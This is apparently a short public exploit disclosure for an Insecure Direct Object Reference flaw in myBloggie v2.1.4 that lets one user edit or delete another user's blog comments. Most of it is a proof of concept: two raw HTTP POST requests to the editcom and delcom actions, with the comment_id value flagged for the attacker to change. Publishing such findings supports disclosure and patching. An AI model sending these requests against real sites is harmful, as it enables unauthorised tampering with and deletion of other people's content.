# Exploit Title: myBloggie v2.1.4 - Insecure Direct Object Reference(IDOR)
## Date: 4/1/2024
## Vendor Homepage: https://sourceforge.net/projects/mybloggie/files/latest/download
## Tested on: Debian Linux, Apache, Mysql
## Vendor: PHP News System
## Version: v2.1.4
## Exploit Description:
## myBloggie v2.1.4 suffers from IDOR - Broken Access Control Vulnerability allowing attackers to update and delete comment that owned by other user(horizontal privilege escalation).

## -----------------------------------------------POC-------------------------------------------------------------------

```
POST /index.php?mode=editcom&post_id=2&comment_id=2(CHANGE HERE) HTTP/1.1
...

commentsubject=comment_from_user2&commenttext=user2+i+am+user1&commentname=user2&commentemail=user2%40test.com&commenthome=&submit=Submit&post_id=2&comment_id=
```

```
POST /index.php?mode=delcom HTTP/1.1
...

post_id=2&comment_id=2(CHANGE HERE)&confirm=yes
```